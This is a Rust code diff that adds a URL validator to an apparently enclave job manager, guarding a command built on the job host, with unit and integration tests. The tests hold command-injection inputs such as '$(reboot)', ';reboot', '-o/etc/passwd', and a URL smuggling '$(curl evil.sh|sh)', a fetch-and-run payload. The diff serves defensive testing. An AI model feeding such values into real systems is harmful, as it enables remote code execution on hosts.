@@ -598,6 +598,36 @@ fn parse_event(event_name: JobEventName, event_data: Value) -> Result<DecodedJob
     }
 }
 
+// The image url comes from job metadata and ends up in a command on the job host
+// It is quoted there, this is a second line of defence and gives a clean rejection
+// Allows http(s) urls made of unreserved characters and the usual url delimiters,
+// anything else has to be percent encoded
+pub fn validate_image_url(url: &str) -> Result<()> {
+    if url.len() > 2048 {
+        return Err(anyhow!("url is too long"));
+    }
+
+    let Some(rest) = url
+        .strip_prefix("https://")
+        .or_else(|| url.strip_prefix("http://"))
+    else {
+        return Err(anyhow!("url is not http or https"));
+    };
+
+    if rest.is_empty() {
+        return Err(anyhow!("url has no host"));
+    }
+
+    if let Some(c) = url
+        .chars()
+        .find(|c| !c.is_ascii_alphanumeric() && !"-._~:/?#[]@%&=+,".contains(*c))
+    {
+        return Err(anyhow!("url has unsupported character {c:?}"));
+    }
+
+    Ok(())
+}
+
 fn whitelist_blacklist_check(
     owner: String,
     address_whitelist: &[String],
@@ -1143,6 +1173,7 @@ impl<'a> JobState<'a> {
         let Some(url) = metadata_json["url"].as_str() else {
             return Err(anyhow!("EIF url not found! Exiting job"));
         };
+        validate_image_url(url).context("EIF url not usable")?;
         self.eif_url = url.to_string();
 
         let Ok(init_params) =
@@ -2024,6 +2055,80 @@ mod tests {
             address_blacklist: vec![],
         };
 
+        let test_results = TestResults {
+            res: JobResult::Failed,
+            outcomes: vec![TestAwsOutcome::SpinDown(test::SpinDownOutcome {
+                time: start_time + Duration::from_secs(0),
+                job: job_id,
+                region: "ap-south-1".into(),
+            })],
+        };
+
+        run_test(start_time, logs, job_manager_params, test_results).await;
+    }
+
+    #[test]
+    fn test_validate_image_url() {
+        for url in [
+            "https://example.com/enclave.eif",
+            "http://example.com:8080/a/b-c_d~e.eif",
+            "https://bucket.s3.amazonaws.com/x.eif?X-Amz-Signature=ab12&X-Amz-Date=2025%2F01,a+b#f",
+            "https://[2001:db8::1]/enclave.eif",
+            "https://user@example.com/enclave.eif",
+        ] {
+            assert!(market::validate_image_url(url).is_ok(), "{url}");
+        }
+
+        for url in [
+            "",
+            "https://",
+            "example.com/enclave.eif",
+            "ftp://example.com/enclave.eif",
+            "file:///etc/passwd",
+            "-o/etc/passwd",
+            "https://example.com/$(reboot)",
+            "https://example.com/`reboot`",
+            "https://example.com/a;reboot",
+            "https://example.com/a|reboot",
+            "https://example.com/a'b",
+            "https://example.com/a\"b",
+            "https://example.com/a b",
+            "https://example.com/a\nb",
+            "https://example.com/a\\b",
+            "https://example.com/{a,b}",
+            "https://example.com/a>b",
+            "https://example.com/\u{0}",
+            "https://example.com/\u{e9}",
+        ] {
+            assert!(market::validate_image_url(url).is_err(), "{url}");
+        }
+
+        assert!(market::validate_image_url(&format!("https://e.com/{}", "a".repeat(2048))).is_err());
+    }
+
+    #[tokio::test(start_paused = true)]
+    async fn test_shell_characters_in_eif_url() {
+        let start_time = Instant::now();
+        let job_id = format!("{:064x}", 1);
+
+        let logs = vec![
+            (0, Action::Open("{\"region\":\"ap-south-1\",\"url\":\"https://example.com/$(curl evil.sh|sh)\",\"instance\":\"c6a.xlarge\",\"memory\":4096,\"vcpu\":2}".to_string(),31000000000000u64,31000u64,0)),
+            (505, Action::Close),
+        ];
+
+        let job_manager_params = JobManagerParams {
+            job_id: market::JobId {
+                id: job_id.clone(),
+                operator: "abc".into(),
+                contract: "xyz".into(),
+                chain: "123".into(),
+            },
+            allowed_regions: vec!["ap-south-1".to_owned()],
+            address_whitelist: vec![],
+            address_blacklist: vec![],
+        };
+
+        // rejected like any other bad metadata, never launched
         let test_results = TestResults {
             res: JobResult::Failed,
             outcomes: vec![TestAwsOutcome::SpinDown(test::SpinDownOutcome {
